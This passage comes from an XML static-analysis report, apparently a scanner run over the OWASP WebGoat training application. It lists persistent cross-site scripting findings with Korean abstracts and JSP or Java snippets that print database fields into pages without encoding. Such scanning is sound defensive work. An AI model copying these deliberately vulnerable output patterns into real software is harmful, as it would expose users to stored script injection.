                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DD5CD86FC7A16115CCED50029E1396F5" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 33 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>33</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F4117ECA0E2E21F34454AC5901AF0A30" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 103 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>103</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;textarea name="&lt;%=SQLInjection.DISCIPLINARY_NOTES%&gt;"  cols="16" rows="3" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C4B549D12E0B69217B2645D2663BDF51" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DatabaseUtilities.java의 writeTable() 메서드가 154 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>154</LineStart>
<Snippet>		for (int i = 1; i &lt; (numColumns + 1); i++)
		{
		    row.addElement(new TD(results.getString(i).replaceAll(" ",
			    "&amp;nbsp;")));
		}</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DOS_Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DOS_Login.java</FilePath>
<LineStart>114</LineStart>
<Snippet>			ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);
		ResultSet results = statement.executeQuery(query);
		if ((results != null) &amp;&amp; (results.first() == true))
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9A9D8E019BBB28263CFA62874B943F99" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 109 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>109</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C4A7981FBF4EEEA2173F0A1FD4789569" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getFirstName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="06A6EF7AAFEFA0C9EFF655FC63D38FE8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F8C29110AAD2D0D2AD9EA54E9B1A5489" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.DESCRIPTION%&gt;" type="text" value="&lt;%=employee.getPersonalDescription()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2942A4265A5BFEB4DF0855CC886DDBD0" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0AF6A1120707B6EFCC45EB315BF5BE2C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 86 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>86</LineStart>
<Snippet>						&lt;!-- Encode data that might contain HTML content to protect against XSS --&gt;

						&lt;%=webSession.htmlEncode(employee.getPersonalDescription())%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A96D64D3E49122B7DCFA905EF3DF4226" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ListStaff.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="21D4519950B6CFD98B0647D10EF2A4B0" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="15D175FF6BEB984B1C59FB059D2CB367" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getStartDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="ABE9713272B817270A78B6916FEB3B61" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="039360ECAF6992610F48AF6E74A3B844" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 45 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>45</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPhoneNumber()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3BD9007236C99EC26C1DAA50069C393D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>				&lt;TR&gt;
					&lt;TD colspan="4"&gt;
						&lt;textarea name="&lt;%=RoleBasedAccessControl.DISCIPLINARY_NOTES%&gt;" cols="53" rows="2" wrap="off" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="88EC1EC974ECCBDDB15FFC08F982997A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD colspan="3"&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getPersonalDescription()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="58B163896652248C0F8F684A3AFB9C66" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 8 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>8</LineStart>
<Snippet>	Employee employee = (Employee) session.getAttribute("CrossSiteScripting.Employee");
%&gt;
		&lt;div class="lesson_title_box"&gt;&lt;strong&gt;Welcome Back &lt;/strong&gt;&lt;span class="lesson_text_db"&gt;&lt;%=webSession.getUserNameInLesson()%&gt;&lt;/span&gt;&lt;/div&gt;
		&lt;div class="lesson_text"&gt;
			&lt;form id="form1" name="form1" method="post" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>203</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				if (answer_results.next())
					name = answer_results.getString("first_name");</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="64B6AE930D4FDF50215437A2DC448E68" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 126 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>126</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=RoleBasedAccessControl.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=RoleBasedAccessControl.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0D01CEB9AF4D9A896C077547167F7F9B" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 18 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>18</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
